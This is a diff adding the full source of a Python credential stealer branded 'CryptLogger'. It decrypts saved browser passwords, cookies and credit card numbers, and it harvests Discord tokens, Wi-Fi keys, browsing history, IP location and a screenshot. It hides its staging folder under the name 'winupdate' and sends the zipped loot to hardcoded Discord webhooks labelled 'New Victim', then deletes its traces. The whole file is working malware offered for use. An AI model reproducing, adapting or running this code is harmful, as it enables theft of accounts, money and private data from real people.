@@ -1,0 +1,765 @@
+try:
+    os.mkdir(os.environ["appdata"] + "/winupdate")
+except:
+    pass
+
+embed = Embed(
+    description="with the difference of Crypthon \n @everyone",
+    color=15535980,
+    timestamp='now'
+)
+
+
+def get_chrome_datetime(chromedate):
+    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
+
+def get_encryption_key(sea, ase):
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", sea, ase,
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = loads(local_state)
+
+    key = b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+def decrypt_password(password, key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return ""
+
+
+def main(konum, konum2, selam):
+    try:
+        file = open(os.environ["appdata"] + "\winupdate\password.txt", "a")
+        key = get_encryption_key(konum, konum2)
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                               konum, konum2, "User Data", selam, "Login Data")
+        filename = "ChromeData.db"
+        copyfile(db_path, filename)
+        db = connect(filename)
+        cursor = db.cursor()
+        cursor.execute(
+            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+        for row in cursor.fetchall():
+            origin_url = row[0]
+            action_url = row[1]
+            username = row[2]
+            password = decrypt_password(row[3], key)
+            date_created = row[4]
+            date_last_used = row[5]
+            if username or password:
+                file.write(f"Origin URL: {origin_url}" + "\n")
+                file.write(f"Action URL: {action_url}" + "\n")
+                file.write(f"Username: {username}" + "\n")
+                file.write(f"Password: {password}" + "\n")
+                file.write(f"Application: {konum}" + "_" + f"{konum2}" + "_" + f"{selam}" + "\n")
+            else:
+                continue
+            if date_created != 86400000000 and date_created:
+                file.write(f"Creation date: {str(get_chrome_datetime(date_created))}" + "\n")
+            if date_last_used != 86400000000 and date_last_used:
+                file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}" + "\n")
+            file.write("=" * 50 + "\n")
+        file.close()
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+    except:
+        pass
+
+
+def get_encryption_key2(sex):
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Roaming",
+                                    "Opera Software", sex, "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = loads(local_state)
+
+    key = b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+def main2(sakso):
+    try:
+        file = open(os.environ["appdata"] + "\winupdate\password.txt", "a")
+        key = get_encryption_key2(sakso)
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming",
+                               "Opera Software", sakso, "Login Data")
+        filename = "OperaGxData.db"
+        copyfile(db_path, filename)
+        db = connect(filename)
+        cursor = db.cursor()
+        cursor.execute(
+            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+        for row in cursor.fetchall():
+            origin_url = row[0]
+            action_url = row[1]
+            username = row[2]
+            password = decrypt_password(row[3], key)
+            date_created = row[4]
+            date_last_used = row[5]
+            if username or password:
+                file.write(f"Origin URL: {origin_url}" + "\n")
+                file.write(f"Action URL: {action_url}" + "\n")
+                file.write(f"Username: {username}" + "\n")
+                file.write(f"Password: {password}" + "\n")
+                file.write("Application: Opera Gx Stable" + "\n")
+            else:
+                continue
+            if date_created != 86400000000 and date_created:
+                file.write(f"Creation date: {str(get_chrome_datetime(date_created))}" + "\n")
+            if date_last_used != 86400000000 and date_last_used:
+                file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}" + "\n")
+            file.write("=" * 50 + "\n")
+        file.close()
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+    except:
+        pass
+
+
+def get_encryption_key3():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Yandex", "YandexBrowser",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = loads(local_state)
+
+    key = b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+def main3(selam):
+    try:
+        file = open(os.environ["appdata"] + "\winupdate\password.txt", "a")
+        key = get_encryption_key3()
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                               "Yandex", "YandexBrowser", "User Data", selam, "Ya Passman Logs")
+        filename = "YandexData.db"
+        copyfile(db_path, filename)
+        db = connect(filename)
+        cursor = db.cursor()
+        cursor.execute(
+            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+        for row in cursor.fetchall():
+            origin_url = row[0]
+            action_url = row[1]
+            username = row[2]
+            password = decrypt_password(row[3], key)
+            date_created = row[4]
+            date_last_used = row[5]
+            if username or password:
+                file.write(f"Origin URL: {origin_url}" + "\n")
+                file.write(f"Action URL: {action_url}" + "\n")
+                file.write(f"Username: {username}" + "\n")
+                file.write(f"Password: {password}" + "\n")
+                file.write(f"Applitacion: YandexBrowser_ {selam}")
+            else:
+                continue
+            if date_created != 86400000000 and date_created:
+                file.write(f"Creation date: {str(get_chrome_datetime(date_created))}" + "\n")
+            if date_last_used != 86400000000 and date_last_used:
+                file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}" + "\n")
+            file.write("=" * 50 + "\n")
+        file.close()
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+    except:
+        pass
+
+
+def cookies(konum, konum2, selam):
+    try:
+        file = open(os.environ["appdata"] + "\winupdate\cookies.txt", "a")
+        key = get_encryption_key(konum, konum2)
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                               konum, konum2, "User Data", selam, "Network", "Cookies")
+        filename = "ChromeData.db"
+        copyfile(db_path, filename)
+        db = connect(filename)
+        cursor = db.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+        for row in cursor.fetchall():
+            file.write(f"Host: {row[0]}" + "\n")
+            file.write(f"Name: {row[1]}" + "\n")
+            file.write(f"Cookie: {decrypt_password(row[2], key)}" + "\n")
+            file.write(f"Application: {konum}_{konum2}_{selam}" + "\n")
+            file.write("=" * 50 + "\n")
+        file.close()
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+    except:
+        pass
+
+
+def cookies2(selam):
+    try:
+        file = open(os.environ["appdata"] + "\winupdate\cookies.txt", "a")
+        key = get_encryption_key2(selam)
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming",
+                               "Opera Software", selam, "Network", "Cookies")
+        filename = "ChromeData.db"
+        copyfile(db_path, filename)
+        db = connect(filename)
+        cursor = db.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+        for row in cursor.fetchall():
+            file.write(f"Host: {row[0]}" + "\n")
+            file.write(f"Name: {row[1]}")
+            file.write(f"Cookie: {decrypt_password(row[2], key)}" + "\n")
+            file.write(f"Application: {selam}")
+            file.write("=" * 50 + "\n")
+        file.close()
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+    except:
+        pass
+
+
+def bakiye(konum, konum2, selam):
+    try:
+        file = open(os.environ["appdata"] + "\winupdate\credit_cards.txt", "a")
+        key = get_encryption_key(konum, konum2)
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                               konum, konum2, "User Data", selam, "Web Data")
+        filename = "ChromeData.db"
+        copyfile(db_path, filename)
+        db = connect(filename)
+        cursor = db.cursor()
+        cursor.execute(
+            "select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
+        for row in cursor.fetchall():
+            username = row[0]
+            month = row[1]
+            year = row[2]
+            password = decrypt_password(row[3], key)
+            file.write("\n" + password + " " + str(month) + "/" + str(year) + " " + username + "\n")
+        file.close()
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+    except:
+        pass
+
+
+def bakiye2(amcik):
+    try:
+        file = open(os.environ["appdata"] + "\winupdate\credit_cards.txt", "a")
+        key = get_encryption_key2(amcik)
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming",
+                               "Opera Software", amcik, "Web Data")
+        filename = "ChromeData.db"
+        copyfile(db_path, filename)
+        db = connect(filename)
+        cursor = db.cursor()
+        cursor.execute(
+            "select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
+        for row in cursor.fetchall():
+            username = row[0]
+            month = row[1]
+            year = row[2]
+            password = decrypt_password(row[3], key)
+            file.write("\n" + password + " " + str(month) + "/" + str(year) + " " + username + "\n")
+        file.close()
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+    except:
+        pass
+
+
+def find(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+
+def dc():
+    try:
+        dosya = open(os.environ["appdata"] + r"\winupdate\token.txt", "w")
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+
+        paths = {
+            'Discord': roaming + '\\Discord',
+            'Discord Canary': roaming + '\\discordcanary',
+            'Discord PTB': roaming + '\\discordptb',
+            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+            'Opera': roaming + '\\Opera Software\\Opera Stable',
+            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
+        }
+
+        message = ''
+
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+
+            message += f'{platform}: '
+
+            tokens = find(path)
+
+            if len(tokens) > 0:
+                for token in tokens:
+                    message += f'{token}\n'
+            else:
+                message += 'Token Yok.\n'
+
+            message += '```'
+        dosya.write(message)
+        dosya.close()
+    except:
+        pass
+
+
+platform_table = {
+    'win32': 2,
+}
+
+
+def get_database_paths(file, file2, file3) -> dict:
+    global abs_chrome_path
+    try:
+        user_platformcode = platform_table[sys.platform]
+    except KeyError:
+        class NotAvailableOS(Exception):
+            pass
+
+        raise NotAvailableOS("It does not support your OS.")
+    platform_code = user_platformcode
+    browser_path_dict = dict()
+    if platform_code == 2:
+        homepath = os.path.expanduser("~")
+        abs_chrome_path = os.path.join(homepath, 'AppData', 'Local', file, file2, 'User Data', file3,
+                                       'History')
+        if os.path.exists(abs_chrome_path):
+            browser_path_dict['chrome'] = abs_chrome_path
+
+    return browser_path_dict
+
+
+def get_browserhistory(selam, amcik, yarrak) -> dict:
+    try:
+        browserhistory = {}
+
+        paths2databases = get_database_paths(selam, amcik, yarrak)
+
+        for browser, path in paths2databases.items():
+            try:
+                conn = connect(path)
+                cursor = conn.cursor()
+                _SQL = ''
+                if browser == 'chrome':
+                    _SQL = """SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') 
+                                    AS last_visit_time FROM urls ORDER BY last_visit_time DESC"""
+                    pass
+                query_result = []
+                try:
+                    cursor.execute(_SQL)
+                    query_result = cursor.fetchall()
+                except OperationalError:
+                    try:
+                        os.system("taskkill /f /im chrome.exe")
+                        cursor.execute(_SQL)
+                        query_result = cursor.fetchall()
+                        os.system("taskkill /f /im brave.exe")
+                        cursor.execute(_SQL)
+                        query_result = cursor.fetchall()
+                        os.system("taskkill /IM msedge.exe /F")
+                        cursor.execute(_SQL)
+                        query_result = cursor.fetchall()
+                    except:
+                        pass
+                except Exception:
+                    try:
+                        os.system("taskkill /f /im chrome.exe")
+                        cursor.execute(_SQL)
+                        query_result = cursor.fetchall()
+                        os.system("taskkill /f /im brave.exe")
+                        cursor.execute(_SQL)
+                        query_result = cursor.fetchall()
+                        os.system("taskkill /IM msedge.exe /F")
+                        cursor.execute(_SQL)
+                        query_result = cursor.fetchall()
+                    except:
+                        pass
+                cursor.close()
+                conn.close()
+                browserhistory[browser] = query_result
+            except OperationalError:
+                pass
+        return browserhistory
+    except:
+        pass
+
+
+def write_browserhistory() -> None:
+    for browser, history in get_browserhistory("Google", "Chrome", "Default").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+    for browser, history in get_browserhistory("Google", "Chrome", "Profile 1").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+    for browser, history in get_browserhistory("Google", "Chrome", "Profile 2").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+    for browser, history in get_browserhistory("Microsoft", "Edge", "Default").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+    for browser, history in get_browserhistory("Microsoft", "Edge", "Default").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+    for browser, history in get_browserhistory("Microsoft", "Edge", "Profile 1").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+    for browser, history in get_browserhistory("Microsoft", "Edge", "Profile 2").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+    for browser, history in get_browserhistory("BraveSoftware", "Brave-Browser", "Default").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+    for browser, history in get_browserhistory("BraveSoftware", "Brave-Browser", "Profile 1").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+    for browser, history in get_browserhistory("BraveSoftware", "Brave-Browser", "Profile 2").items():
+        with open(os.environ["appdata"] + '\winupdate\history.txt', mode='a', encoding='utf-8', newline='') as f:
+            for data in history:
+                f.write(str(data))
+
+
+def wifi():
+    try:
+        command = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
+        profile_names = (findall("All User Profile     : (.*)\r", command))
+        wifi_name_list = open(os.environ["appdata"] + r"\winupdate\wifi.txt", "w")
+
+        if len(profile_names) != 0:
+            for name in profile_names:
+                wifi_profile = {}
+                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name],
+                                              capture_output=True).stdout.decode()
+                if search("Security key           : Absent", profile_info):
+                    continue
+                else:
+                    wifi_profile["Wifi"] = name
+
+                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
+                                                       capture_output=True).stdout.decode()
+                    password = search("Key Content            : (.*)\r", profile_info_pass)
+                    if password == None:
+                        wifi_profile["Password"] = None
+                    else:
+                        wifi_profile["Password"] = password[1]
+                    wifi_name_list.write(str(wifi_profile))
+        else:
+            wifi_name_list.write(
+                "BU oç hayatı boyunca hiç bi wifi e otomatik bağlan seçeneğini kullanmamış\nyani wifi şifresi yok.")
+    except:
+        pass
+
+
+def info():
+    file = open(os.environ["appdata"] + r"\winupdate\location.txt", "w")
+    try:
+        ip = get("http://ip-api.com/json/?fields=225545").text
+    except:
+        try:
+            ip = get("https://ipinfo.io/json").text
+        except:
+            try:
+                ip = get("https://httpbin.org/get").text
+            except:
+                try:
+                    ip = get("https://httpbin.org/get").text
+                except:
+                    ip = "ip öğrenilemiyor"
+
+    file.write(str(ip))
+    file.close()
+
+
+def get_all_file(path):
+    file_paths = []
+    for root, direct, file in os.walk(path):
+        for filename in file:
+            filepath = os.path.join(root, filename)
+            file_paths.append(filepath)
+
+    return file_paths
+
+
+def zip_file():
+    directory = os.environ["appdata"] + "/winupdate"
+    file_paths = get_all_file(directory)
+
+    with ZipFile(os.environ["appdata"] + r"\\" + f"{os.environ['computername']}" + ".zip", "w") as f:
+        for file in file_paths:
+            f.write(file)
+
+
+def detect_vm():
+    global a
+    a = ""
+    objWmi = WMI()
+    for diskDrive in objWmi.query("select * from Win32_DiskDrive"):
+        if "vbox" in diskDrive.Caption.lower() or "virtual" in diskDrive.Caption.lower():
+            a = "VirtualMachine"
+    a = " "
+
+
+def screenshot():
+    with mss() as ms:
+        ms.shot(output=os.environ["appdata"] + "/screenshot.png")
+    hook = Webhook("https://discord.com/api/webhooks/1046845191337803918/XvfZSxBd9tgREe3ZFH5x6TuJGyX24SpDpEifL0_bhiyQZ3qPfH1pM1E1HdttGWnZVmIN")
+    file = File(os.environ["appdata"] + "/screenshot.png")
+    hook.send(file=file)
+    try:
+        os.remove(os.environ["appdata"] + "/screenshot.png")
+    except:
+        pass
+
+
+def ana():
+    detect_vm()
+    img = "https://images-ext-2.discordapp.net/external/8_XRBxiJdDcKXyUMqNwDiAtIb8lt70DaUHRiUd_bsf4/https/i.imgur.com/q1NJvOx.png"
+    try:
+        ip = get("https://api.ipify.org/").text
+    except:
+        try:
+            ip = get("https://icanhazip.com").text
+        except:
+            ip = "ip şuanda öğrenilemiyor"
+    pcname = os.environ["computername"]
+    username = os.environ["username"]
+    cpu = WMI().Win32_Processor()[0].Name
+    gpu = WMI().Win32_VideoController()[0].Name
+    ram = round(float(WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
+    hook = Webhook(
+        "https://discord.com/api/webhooks/1045727616935669781/XeUiWilZQbszwEQRM5dTkEFrTvaAFtJ2P8rjDaABwHW3uqxbwqydwJz1lfAG6Nxe-p21")
+    embed.set_title(title="New Victim by CryptLogger")
+    embed.set_author(name="CrypLogger",
+                     icon_url="https://images-ext-2.discordapp.net/external/8_XRBxiJdDcKXyUMqNwDiAtIb8lt70DaUHRiUd_bsf4/https/i.imgur.com/q1NJvOx.png")
+    embed.add_field(name="\nİP Adress ", value=str(ip))
+    embed.add_field(name="\nUserName\n", value=username)
+    embed.add_field(name="\nComputerName\n", value=pcname)
+    embed.add_field(name="\nCPU\n", value=cpu)
+    embed.add_field(name="\nGPU\n", value=gpu)
+    embed.add_field(name="\nRAM\n", value=f"{str(ram)} GB RAM Memory")
+    embed.set_thumbnail(img)
+    file = File(os.environ["appdata"] + r"\\" + pcname + ".zip")
+    hook.send(embed=embed, file=file)
+
+    if a == "VirtualMachine":
+        msg = open(os.environ["appdata"] + "/msg.vbs", "w")
+        msg.write(
+            "Msgbox \"" + "THIS PROGRAM DOES NOT WORK ON VIRTUAL MACHINE!" + "\" , vbOkOnly + vbInformation + vbSystemModal, \"Message\"")
+        msg.close()
+
+        subprocess.Popen(["cscript", os.environ["appdata"] + "/msg.vbs"], shell=True)
+        try:
+            os.remove(os.environ["appdata"] + "/msg.vbs")
+        except:
+            pass
+
+
+def run():
+    main("Google", "Chrome", "Default")
+    main("Google", "Chrome", "Profile 1")
+    main("Google", "Chrome", "Profile 2")
+    main("Google", "Chrome", "Profile 3")
+    main("Google", "Chrome", "Profile 4")
+    main("Google", "Chrome", "Profile 5")
+    main("Google", "Chrome", "Profile 6")
+    main("Google", "Chrome", "Profile 7")
+    main("Google", "Chrome", "Profile 8")
+    main("Google", "Chrome", "Profile 9")
+    main("Google", "Chrome", "Profile 10")
+    main("BraveSoftware", "Brave-Browser", "Default")
+    main("BraveSoftware", "Brave-Browser", "Profile 1")
+    main("BraveSoftware", "Brave-Browser", "Profile 2")
+    main("BraveSoftware", "Brave-Browser", "Profile 3")
+    main("BraveSoftware", "Brave-Browser", "Profile 4")
+    main("BraveSoftware", "Brave-Browser", "Profile 5")
+    main("BraveSoftware", "Brave-Browser", "Profile 6")
+    main("BraveSoftware", "Brave-Browser", "Profile 7")
+    main("BraveSoftware", "Brave-Browser", "Profile 8")
+    main("BraveSoftware", "Brave-Browser", "Profile 9")
+    main("BraveSoftware", "Brave-Browser", "Profile 10")
+    main("BraveSoftware", "Brave-Browser", "Profile 10")
+    main("Microsoft", "Edge", "Default")
+    main("Microsoft", "Edge", "Profile 1")
+    main("Microsoft", "Edge", "Profile 2")
+    main("Microsoft", "Edge", "Profile 3")
+    main("Microsoft", "Edge", "Profile 4")
+    main("Microsoft", "Edge", "Profile 5")
+    main("Microsoft", "Edge", "Profile 6")
+    main("Microsoft", "Edge", "Profile 7")
+    main("Microsoft", "Edge", "Profile 8")
+    main("Microsoft", "Edge", "Profile 9")
+    main("Microsoft", "Edge", "Profile 10")
+    main2("Opera GX Stable")
+    main2("Opera Stable")
+    main3("Default")
+    main3("Profile 1")
+    main3("Profile 2")
+    main3("Profile 3")
+    main3("Profile 4")
+    main3("Profile 5")
+    main3("Profile 6")
+    main3("Profile 7")
+    main3("Profile 8")
+    main3("Profile 9")
+    main3("Profile 10")
+    bakiye("Google", "Chrome", "Default")
+    bakiye("Google", "Chrome", "Profile 1")
+    bakiye("Google", "Chrome", "Profile 2")
+    bakiye("Google", "Chrome", "Profile 3")
+    bakiye("Google", "Chrome", "Profile 4")
+    bakiye("Google", "Chrome", "Profile 5")
+    bakiye("BraveSoftware", "Brave-Browser", "Default")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 1")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 2")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 3")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 4")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 5")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 6")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 7")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 8")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 9")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 10")
+    bakiye("BraveSoftware", "Brave-Browser", "Profile 11")
+    bakiye("Microsoft", "Edge", "Default")
+    bakiye("Microsoft", "Edge", "Profile 1")
+    bakiye("Microsoft", "Edge", "Profile 2")
+    bakiye("Microsoft", "Edge", "Profile 3")
+    bakiye("Microsoft", "Edge", "Profile 4")
+    bakiye("Microsoft", "Edge", "Profile 5")
+    bakiye("Microsoft", "Edge", "Profile 6")
+    bakiye("Microsoft", "Edge", "Profile 7")
+    bakiye("Microsoft", "Edge", "Profile 8")
+    bakiye("Microsoft", "Edge", "Profile 9")
+    bakiye("Microsoft", "Edge", "Profile 10")
+    bakiye2("Opera GX Stable")
+    bakiye2("Opera Stable")
+    write_browserhistory()
+    cookies("Google", "Chrome", "Default")
+    cookies("Google", "Chrome", "Profile 1")
+    cookies("Google", "Chrome", "Profile 2")
+    cookies("Google", "Chrome", "Profile 3")
+    cookies("Google", "Chrome", "Profile 4")
+    cookies("Google", "Chrome", "Profile 5")
+    cookies("Google", "Chrome", "Profile 6")
+    cookies("Google", "Chrome", "Profile 7")
+    cookies("Google", "Chrome", "Profile 8")
+    cookies("Google", "Chrome", "Profile 9")
+    cookies("Google", "Chrome", "Profile 10")
+    cookies("Google", "Chrome", "Profile 11")
+    cookies("Google", "Chrome", "Profile 12")
+    cookies("Google", "Chrome", "Profile 13")
+    cookies("Google", "Chrome", "Profile 14")
+    cookies("Google", "Chrome", "Profile 15")
+    cookies("Microsoft", "Edge", "Default")
+    cookies("Microsoft", "Edge", "Profile 1")
+    cookies("Microsoft", "Edge", "Profile 2")
+    cookies("Microsoft", "Edge", "Profile 3")
+    cookies("Microsoft", "Edge", "Profile 4")
+    cookies("Microsoft", "Edge", "Profile 5")
+    cookies("Microsoft", "Edge", "Profile 6")
+    cookies("Microsoft", "Edge", "Profile 7")
+    cookies("Microsoft", "Edge", "Profile 8")
+    cookies("Microsoft", "Edge", "Profile 9")
+    cookies("Microsoft", "Edge", "Profile 10")
+    cookies("Microsoft", "Edge", "Profile 11")
+    cookies("Microsoft", "Edge", "Profile 12")
+    cookies("Microsoft", "Edge", "Profile 13")
+    cookies("BraveSoftware", "Brave-Browser", "Default")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 1")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 2")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 3")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 4")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 5")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 6")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 7")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 8")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 9")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 10")
+    cookies("BraveSoftware", "Brave-Browser", "Profile 11")
+    cookies2("Opera GX Stable")
+    cookies2("Opera Stable")
+    dc()
+    info()
+    wifi()
+
+
+if __name__ == '__main__':
+    run()
+    zip_file()
+    ana()
+    screenshot()
+    try:
+        rmtree(os.environ["appdata"] + r"\winupdate")
+        os.remove(os.environ["appdata"] + "\\" + os.environ["computername"] + ".zip")
+    except:
+        pass
